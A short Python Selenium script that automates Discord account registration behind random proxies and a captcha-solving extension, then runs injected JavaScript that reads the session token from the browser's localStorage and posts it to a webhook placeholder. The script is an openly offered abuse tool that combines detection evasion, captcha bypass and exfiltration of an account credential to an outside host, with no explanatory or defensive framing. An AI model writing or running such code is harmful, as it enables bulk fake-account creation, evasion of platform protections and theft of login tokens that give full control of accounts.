import undetected_chromedriver as uc
uc.install()
import os
import time 
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC  
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import random
options = uc.ChromeOptions()
username = input("username: ")
a_file = open("proxies.txt")
lines = a_file.readlines()
foo = lines
PROXY = random.choice(foo)
options.add_extension("Buster.crx")
options.add_argument(f'--proxy-server=http://{PROXY}')
driver = webdriver.Chrome(executable_path='chromedriver.exe', options=options) 


driver.get("https://discord.com")
time.sleep(3)
driver.find_element_by_xpath('//*[@id="app-mount"]/div/div/div[1]/div[2]/div/div[2]/button').click()
                             
time.sleep(0.5)
driver.find_element_by_xpath('//*[@id="app-mount"]/div/div/div[1]/div[2]/div/div[2]/form/input').send_keys(username)
driver.find_element_by_xpath('//*[@id="app-mount"]/div/div/div[1]/div[2]/div/div[2]/div/div').click()
time.sleep(0.5)
driver.find_element_by_xpath('//*[@id="app-mount"]/div/div/div[1]/div[2]/div/div[2]/form/button').click()
input("press enter if you solved the captcha: ")
time.sleep(5)

driver.execute_script('''
var discordWebhook = "YOURWEBHOOK";
location.reload();
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {

    content: i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') 
};
request.send(JSON.stringify(params));

''')
